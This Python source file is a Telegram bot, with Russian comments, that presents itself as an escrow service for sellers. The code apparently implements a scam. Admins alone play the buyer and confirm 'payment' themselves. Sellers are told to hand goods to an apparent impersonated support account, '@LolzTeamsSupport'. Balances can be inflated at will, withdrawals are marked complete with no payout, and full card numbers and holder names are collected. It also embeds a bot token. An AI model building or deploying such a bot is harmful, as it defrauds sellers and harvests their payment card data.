import asyncio
import logging
import sqlite3
import uuid
import threading
import time
import requests
from datetime import datetime
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command, CommandStart
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# ==================== НАСТРОЙКИ ====================
BOT_TOKEN = "8512473902:AAEjXmCgzsZ6ikZG0js2lwh_NRnDJwUuSMM"
ADMIN_IDS = [7654091786, 8259572484]  # Два админа
# ===================================================

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())
logging.basicConfig(level=logging.INFO)

# ==================== ФУНКЦИЯ АВТОПИНГА ====================
def keep_alive():
    """Каждые 5 минут будит самого себя"""
    RENDER_URL = "https://telegram-bot-phe1.onrender.com"
    
    while True:
        try:
            response = requests.get(RENDER_URL, timeout=30)
            now = datetime.now().strftime("%H:%M:%S")
            print(f"[KeepAlive] Пинг в {now} | Статус: {response.status_code}")
        except Exception as e:
            now = datetime.now().strftime("%H:%M:%S")
            print(f"[KeepAlive] Ошибка: {e}")
        time.sleep(300)

threading.Thread(target=keep_alive, daemon=True).start()
# =========================================================

# ==================== БАЗА ДАННЫХ ====================
def init_db():
    with sqlite3.connect('data.db') as conn:
        conn.executescript('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY, username TEXT, balance REAL DEFAULT 0,
                card TEXT, wallet TEXT, verified INTEGER DEFAULT 0, deals INTEGER DEFAULT 0
            );
            CREATE TABLE IF NOT EXISTS deals (
                deal_id TEXT PRIMARY KEY, seller_id INTEGER, seller_name TEXT,
                buyer TEXT, item TEXT, amount REAL, status TEXT, created TEXT
            );
            CREATE TABLE IF NOT EXISTS withdraws (
                req_id TEXT PRIMARY KEY, user_id INTEGER, amount REAL, 
                method TEXT, details TEXT, status TEXT, date TEXT
            );
        ''')
init_db()

# ==================== ФУНКЦИИ ====================
def db_exec(query, params=()):
    with sqlite3.connect('data.db') as conn:
        cur = conn.cursor()
        cur.execute(query, params)
        conn.commit()
        return cur.fetchall()

def get_user(user_id):
    r = db_exec("SELECT * FROM users WHERE user_id=?", (user_id,))
    return r[0] if r else None

def create_user(user_id, username):
    db_exec("INSERT OR IGNORE INTO users (user_id, username) VALUES (?, ?)", (user_id, username))

def update_balance(user_id, amount):
    db_exec("UPDATE users SET balance = balance + ? WHERE user_id=?", (amount, user_id))

def create_deal(seller_id, seller_name, buyer, item, amount):
    deal_id = str(uuid.uuid4())[:8].upper()
    db_exec("INSERT INTO deals VALUES (?,?,?,?,?,?,?,?)", 
            (deal_id, seller_id, seller_name, buyer, item, amount, "waiting", datetime.now().strftime("%d.%m %H:%M")))
    return deal_id

def get_deal(deal_id):
    r = db_exec("SELECT * FROM deals WHERE deal_id=?", (deal_id,))
    return r[0] if r else None

def update_deal(deal_id, status):
    db_exec("UPDATE deals SET status=? WHERE deal_id=?", (status, deal_id))

def get_deals(status=None):
    if status:
        return db_exec("SELECT * FROM deals WHERE status=? ORDER BY created DESC", (status,))
    return db_exec("SELECT * FROM deals ORDER BY created DESC")

def save_card(uid, card, holder):
    db_exec("UPDATE users SET card=?, holder=?, verified=1 WHERE user_id=?", (card, holder, uid))

def save_wallet(uid, wallet):
    db_exec("UPDATE users SET wallet=?, verified=1 WHERE user_id=?", (wallet, uid))

def create_withdraw(uid, amount, method, details):
    req_id = str(uuid.uuid4())[:8].upper()
    db_exec("INSERT INTO withdraws VALUES (?,?,?,?,?,?,?)",
            (req_id, uid, amount, method, details, "pending", datetime.now().strftime("%d.%m %H:%M")))
    return req_id

def get_withdraws(status="pending"):
    return db_exec("SELECT * FROM withdraws WHERE status=? ORDER BY date", (status,))

def update_withdraw(req_id, status):
    db_exec("UPDATE withdraws SET status=? WHERE req_id=?", (status, req_id))

# ==================== СОСТОЯНИЯ ====================
class States:
    class Seller(StatesGroup):
        buyer = State(); item = State(); amount = State()
    class Withdraw(StatesGroup):
        amount = State(); card = State(); holder = State(); wallet = State()
    class Admin(StatesGroup):
        user_id = State(); amount = State()

# ==================== КЛАВИАТУРЫ ====================
def kb_main(uid):
    user = get_user(uid)
    bal = f"💰 ${user[2]:.2f}" if user else "💰 Баланс"
    btns = []
    if uid in ADMIN_IDS:
        btns = [[InlineKeyboardButton(text="📋 Сделки", callback_data="deals")],
                [InlineKeyboardButton(text=bal, callback_data="balance")],
                [InlineKeyboardButton(text="⚙️ Админ", callback_data="admin")]]
    else:
        btns = [[InlineKeyboardButton(text="📝 Продать", callback_data="sell")],
                [InlineKeyboardButton(text=bal, callback_data="balance")],
                [InlineKeyboardButton(text="💳 Кошелек", callback_data="wallet")],
                [InlineKeyboardButton(text="💸 Вывод", callback_data="withdraw")]]
    return InlineKeyboardMarkup(inline_keyboard=btns)

def kb_deal(deal_id, status, role):
    btns = []
    if role == "buyer":
        if status == "waiting": btns.append([InlineKeyboardButton(text="✅ Подтвердить оплату", callback_data=f"pay_{deal_id}")])
        elif status == "sent": btns.append([InlineKeyboardButton(text="📦 Получил товар", callback_data=f"done_{deal_id}")])
    else:
        if status == "paid": btns.append([InlineKeyboardButton(text="📦 Отправил", callback_data=f"send_{deal_id}")])
    if status not in ["done"]:
        btns.append([InlineKeyboardButton(text="❌ Отмена", callback_data=f"cancel_{deal_id}")])
    btns.append([InlineKeyboardButton(text="◀️ Назад", callback_data="back")])
    return InlineKeyboardMarkup(inline_keyboard=btns)

def kb_back():
    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="◀️ Назад", callback_data="back")]])

def kb_admin_panel():
    """Клавиатура для админ-панели"""
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="👥 Юзеры", callback_data="a_users")],
        [InlineKeyboardButton(text="💰 Накрутка", callback_data="a_balance")],
        [InlineKeyboardButton(text="📋 Выводы", callback_data="a_withdraws")],
        [InlineKeyboardButton(text="📊 Стата", callback_data="a_stats")],
        [InlineKeyboardButton(text="◀️ Главное меню", callback_data="back")]
    ])

# ==================== КОМАНДА /ADMIN (НОВАЯ) ====================
@dp.message(Command('admin'))
async def admin_command(msg: Message):
    """Открывает админ-панель по команде /admin"""
    if msg.from_user.id in ADMIN_IDS:
        await msg.answer(
            "⚙️ **Админ-панель**\n"
            "━━━━━━━━━━━━━━━━\n"
            "Выберите действие:",
            parse_mode="Markdown",
            reply_markup=kb_admin_panel()
        )
    else:
        await msg.answer("❌ У вас нет доступа к админ-панели.")
# ================================================================

# ==================== СТАРТ ====================
@dp.message(CommandStart())
async def start(msg: Message):
    create_user(msg.from_user.id, msg.from_user.username or "no_name")
    is_admin = " Админ" if msg.from_user.id in ADMIN_IDS else ""
    await msg.answer(f"👋 Добро пожаловать{is_admin}!", reply_markup=kb_main(msg.from_user.id))

@dp.callback_query(F.data == "back")
async def back(call: CallbackQuery):
    await call.message.edit_text("Меню:", reply_markup=kb_main(call.from_user.id))
    await call.answer()

# ==================== БАЛАНС ====================
@dp.callback_query(F.data == "balance")
async def balance(call: CallbackQuery):
    u = get_user(call.from_user.id)
    txt = f"💰 **Баланс:** ${u[2]:.2f}\n✅ Вериф.: {'Да' if u[5] else 'Нет'}\n📊 Сделок: {u[6]}"
    if u[3]: txt += f"\n💳 Карта: {u[3][:4]}****{u[3][-4:]}"
    if u[4]: txt += f"\n₿ Кошелек: {u[4][:6]}...{u[4][-4:]}"
    await call.message.edit_text(txt, parse_mode="Markdown", reply_markup=kb_back())

# ==================== ПРОДАВЕЦ ====================
@dp.callback_query(F.data == "sell")
async def sell_start(call: CallbackQuery, state: FSMContext):
    await call.message.edit_text("👤 @username покупателя:")
    await state.set_state(States.Seller.buyer)
    await call.answer()

@dp.message(States.Seller.buyer)
async def sell_buyer(msg: Message, state: FSMContext):
    if not msg.text.startswith('@'): 
        await msg.answer("❌ Начинайте с @")
        return
    await state.update_data(buyer=msg.text)
    await msg.answer("📦 Название товара:")
    await state.set_state(States.Seller.item)

@dp.message(States.Seller.item)
async def sell_item(msg: Message, state: FSMContext):
    await state.update_data(item=msg.text)
    await msg.answer("💰 Сумма USD:")
    await state.set_state(States.Seller.amount)

@dp.message(States.Seller.amount)
async def sell_amount(msg: Message, state: FSMContext):
    try:
        data = await state.get_data()
        deal_id = create_deal(msg.from_user.id, msg.from_user.username, data['buyer'], data['item'], float(msg.text))
        await msg.answer(f"✅ Сделка {deal_id} создана", reply_markup=kb_main(msg.from_user.id))
        # Отправляем всем админам
        for admin_id in ADMIN_IDS:
            try:
                await bot.send_message(admin_id, f"🆕 Новая сделка!\nID: `{deal_id}`\nТовар: {data['item']}\nСумма: ${msg.text}\nПродавец: @{msg.from_user.username}\nПокупатель: {data['buyer']}", 
                                    parse_mode="Markdown", reply_markup=kb_deal(deal_id, "waiting", "buyer"))
            except: pass
        await state.clear()
    except:
        await msg.answer("❌ Ошибка")

# ==================== ПОКУПАТЕЛЬ (АДМИНЫ) ====================
@dp.callback_query(F.data.startswith("pay_"))
async def pay_deal(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS:
        return await call.answer("❌ Нет доступа", show_alert=True)
    deal_id = call.data[4:]
    deal = get_deal(deal_id)
    if not deal: return await call.answer("❌ Нет сделки", show_alert=True)
    update_deal(deal_id, "paid")
    await call.message.edit_text(f"✅ Оплата подтверждена\nID: {deal_id}", reply_markup=kb_main(call.from_user.id))
    await bot.send_message(deal[1], f"💰 Оплата получена!\nID: {deal_id}\nОтправьте товар (строго менеджеру) @LolzTeamsSupport и нажмите кнопку:", 
                          reply_markup=kb_deal(deal_id, "paid", "seller"))
    await call.answer()

@dp.callback_query(F.data.startswith("send_"))
async def send_deal(call: CallbackQuery):
    deal_id = call.data[5:]
    deal = get_deal(deal_id)
    if not deal or call.from_user.id != deal[1]: return await call.answer("❌ Ошибка", show_alert=True)
    update_deal(deal_id, "sent")
    await call.message.edit_text(f"📦 Товар отправлен\nID: {deal_id}", reply_markup=kb_main(deal[1]))
    # Отправляем всем админам
    for admin_id in ADMIN_IDS:
        try:
            await bot.send_message(admin_id, f"📦 Товар отправлен!\nID: {deal_id}\nПодтвердите получение:", 
                                  reply_markup=kb_deal(deal_id, "sent", "buyer"))
        except: pass
    await call.answer()

@dp.callback_query(F.data.startswith("done_"))
async def done_deal(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS:
        return await call.answer("❌ Нет доступа", show_alert=True)
    deal_id = call.data[5:]
    deal = get_deal(deal_id)
    if not deal: return await call.answer("❌ Ошибка", show_alert=True)
    update_deal(deal_id, "done")
    update_balance(deal[1], deal[5])
    await call.message.edit_text(f"🎉 Сделка завершена!\nID: {deal_id}", reply_markup=kb_main(call.from_user.id))
    await bot.send_message(deal[1], f"✅ Деньги зачислены!\nID: {deal_id}\nСумма: ${deal[5]}", reply_markup=kb_main(deal[1]))
    await call.answer()

@dp.callback_query(F.data.startswith("cancel_"))
async def cancel_deal(call: CallbackQuery):
    deal_id = call.data[7:]
    deal = get_deal(deal_id)
    if not deal: return await call.answer("❌ Ошибка", show_alert=True)
    if call.from_user.id != deal[1] and call.from_user.id not in ADMIN_IDS:
        return
    update_deal(deal_id, "cancelled")
    await call.message.edit_text(f"❌ Сделка отменена\nID: {deal_id}", reply_markup=kb_main(call.from_user.id))
    if call.from_user.id in ADMIN_IDS:
        await bot.send_message(deal[1], f"❌ Сделка отменена гарантом\nID: {deal_id}")
    else:
        for admin_id in ADMIN_IDS:
            try:
                await bot.send_message(admin_id, f"❌ Сделка отменена продавцом\nID: {deal_id}")
            except: pass
    await call.answer()

@dp.callback_query(F.data == "deals")
async def show_deals(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS:
        return await call.answer("❌ Нет доступа", show_alert=True)
    deals = get_deals()
    txt = "📋 **Все сделки**\n"
    for d in deals[:10]:
        emoji = {"waiting":"🆕","paid":"💰","sent":"📦","done":"✅","cancelled":"❌"}.get(d[6], "⏳")
        txt += f"{emoji} `{d[0]}` {d[4]} | ${d[5]} | @{d[2]}\n"
    await call.message.edit_text(txt, parse_mode="Markdown", reply_markup=kb_back())

# ==================== КОШЕЛЕК ====================
@dp.callback_query(F.data == "wallet")
async def wallet_menu(call: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💳 Карта", callback_data="add_card")],
        [InlineKeyboardButton(text="₿ Кошелек", callback_data="add_wallet")],
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back")]
    ])
    await call.message.edit_text("Выберите:", reply_markup=kb)

@dp.callback_query(F.data == "add_card")
async def add_card(call: CallbackQuery, state: FSMContext):
    await call.message.edit_text("Введите номер карты (16 цифр):")
    await state.set_state(States.Withdraw.card)
    await call.answer()

@dp.message(States.Withdraw.card)
async def proc_card(msg: Message, state: FSMContext):
    card = msg.text.replace(" ", "")
    if not card.isdigit() or len(card) != 16:
        await msg.answer("❌ Неверный формат")
        return
    await state.update_data(card=card)
    await msg.answer("Введите имя владельца:")
    await state.set_state(States.Withdraw.holder)

@dp.message(States.Withdraw.holder)
async def proc_holder(msg: Message, state: FSMContext):
    data = await state.get_data()
    save_card(msg.from_user.id, data['card'], msg.text.upper())
    await msg.answer("✅ Карта привязана", reply_markup=kb_main(msg.from_user.id))
    await state.clear()

@dp.callback_query(F.data == "add_wallet")
async def add_wallet(call: CallbackQuery, state: FSMContext):
    await call.message.edit_text("Введите адрес кошелька (TRC20):")
    await state.set_state(States.Withdraw.wallet)
    await call.answer()

@dp.message(States.Withdraw.wallet)
async def proc_wallet(msg: Message, state: FSMContext):
    save_wallet(msg.from_user.id, msg.text.strip())
    await msg.answer("✅ Кошелек привязан", reply_markup=kb_main(msg.from_user.id))
    await state.clear()

# ==================== ВЫВОД ====================
@dp.callback_query(F.data == "withdraw")
async def withdraw_start(call: CallbackQuery, state: FSMContext):
    u = get_user(call.from_user.id)
    if not u[3] and not u[4]:
        await call.message.edit_text("❌ Сначала привяжите карту/кошелек", reply_markup=kb_back())
        return
    await call.message.edit_text(f"💰 Баланс: ${u[2]:.2f}\nВведите сумму:")
    await state.set_state(States.Withdraw.amount)
    await call.answer()

@dp.message(States.Withdraw.amount)
async def withdraw_amount(msg: Message, state: FSMContext):
    try:
        am = float(msg.text)
        u = get_user(msg.from_user.id)
        if am > u[2]: return await msg.answer("❌ Недостаточно")
        await state.update_data(amount=am)
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="💳 На карту", callback_data="w_card")],
            [InlineKeyboardButton(text="₿ На кошелек", callback_data="w_wallet")]
        ])
        await msg.answer("Куда выводим?", reply_markup=kb)
    except:
        await msg.answer("❌ Введите число")

@dp.callback_query(F.data == "w_card")
async def w_card(call: CallbackQuery, state: FSMContext):
    u = get_user(call.from_user.id)
    if not u[3]: return await call.answer("❌ Нет карты")
    data = await state.get_data()
    req_id = create_withdraw(call.from_user.id, data['amount'], "card", f"{u[3]} {u[4]}")
    update_balance(call.from_user.id, -data['amount'])
    await call.message.edit_text(f"✅ Заявка {req_id} создана", reply_markup=kb_main(call.from_user.id))
    await state.clear()

@dp.callback_query(F.data == "w_wallet")
async def w_wallet(call: CallbackQuery, state: FSMContext):
    u = get_user(call.from_user.id)
    if not u[4]: return await call.answer("❌ Нет кошелька")
    data = await state.get_data()
    req_id = create_withdraw(call.from_user.id, data['amount'], "crypto", u[4])
    update_balance(call.from_user.id, -data['amount'])
    await call.message.edit_text(f"✅ Заявка {req_id} создана", reply_markup=kb_main(call.from_user.id))
    await state.clear()

# ==================== АДМИН ====================
@dp.callback_query(F.data == "admin")
async def admin_menu(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS:
        return await call.answer("❌ Нет доступа", show_alert=True)
    await call.message.edit_text(
        "⚙️ **Админ-панель**\n"
        "━━━━━━━━━━━━━━━━\n"
        "Выберите действие:",
        parse_mode="Markdown",
        reply_markup=kb_admin_panel()
    )

@dp.callback_query(F.data == "a_users")
async def a_users(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return
    users = db_exec("SELECT user_id, username, balance, verified FROM users LIMIT 20")
    txt = "👥 **Пользователи**\n"
    for u in users:
        txt += f"`{u[0]}` @{u[1]} | ${u[2]:.2f} | {'✅' if u[3] else '❌'}\n"
    await call.message.edit_text(txt, parse_mode="HTML", reply_markup=kb_back())

@dp.callback_query(F.data == "a_balance")
async def a_balance_start(call: CallbackQuery, state: FSMContext):
    if call.from_user.id not in ADMIN_IDS: return
    await call.message.edit_text("Введите ID пользователя:")
    await state.set_state(States.Admin.user_id)
    await call.answer()

@dp.message(States.Admin.user_id)
async def a_balance_user(msg: Message, state: FSMContext):
    try:
        uid = int(msg.text)
        if not get_user(uid): return await msg.answer("❌ Не найден")
        await state.update_data(uid=uid)
        await msg.answer("Сумма:")
        await state.set_state(States.Admin.amount)
    except:
        await msg.answer("❌ Ошибка")

@dp.message(States.Admin.amount)
async def a_balance_amount(msg: Message, state: FSMContext):
    try:
        am = float(msg.text)
        data = await state.get_data()
        update_balance(data['uid'], am)
        await msg.answer(f"✅ Начислено ${am}", reply_markup=kb_main(msg.from_user.id))
        await bot.send_message(data['uid'], f"🎉 Вам начислено ${am}!")
        await state.clear()
    except:
        await msg.answer("❌ Ошибка")

@dp.callback_query(F.data == "a_withdraws")
async def a_withdraws(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return
    w = get_withdraws()
    if not w:
        await call.message.edit_text("❌ Нет заявок", reply_markup=kb_back())
        return
    txt = "📋 **Заявки**\n"
    for i in w:
        txt += f"`{i[0]}` {i[1]} | ${i[2]} | {i[3]}\n{i[4]}\n"
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Все", callback_data="a_approve_all")],
        [InlineKeyboardButton(text="◀️ Назад", callback_data="admin")]
    ])
    await call.message.edit_text(txt, parse_mode="Markdown", reply_markup=kb)

@dp.callback_query(F.data == "a_approve_all")
async def a_approve_all(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return
    for w in get_withdraws():
        update_withdraw(w[0], "done")
        try:
            await bot.send_message(w[1], f"✅ Вывод ${w[2]} выполнен!")
        except: pass
    await call.message.edit_text("✅ Все заявки обработаны", reply_markup=kb_main(call.from_user.id))

@dp.callback_query(F.data == "a_stats")
async def a_stats(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return
    users = db_exec("SELECT COUNT(*) FROM users")[0][0]
    balance = db_exec("SELECT SUM(balance) FROM users")[0][0] or 0
    deals = db_exec("SELECT COUNT(*) FROM deals")[0][0]
    done = db_exec("SELECT COUNT(*) FROM deals WHERE status='done'")[0][0]
    pend = db_exec("SELECT COUNT(*) FROM withdraws WHERE status='pending'")[0][0]
    txt = f"📊 **Статистика**\n👥 Юзеров: {users}\n💰 Баланс: ${balance:.2f}\n📊 Сделок: {deals}\n✅ Завершено: {done}\n⏳ Выводов: {pend}"
    await call.message.edit_text(txt, parse_mode="Markdown", reply_markup=kb_back())

# ==================== ЗАПУСК ====================
async def main():
    print("✅ Бот запущен")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
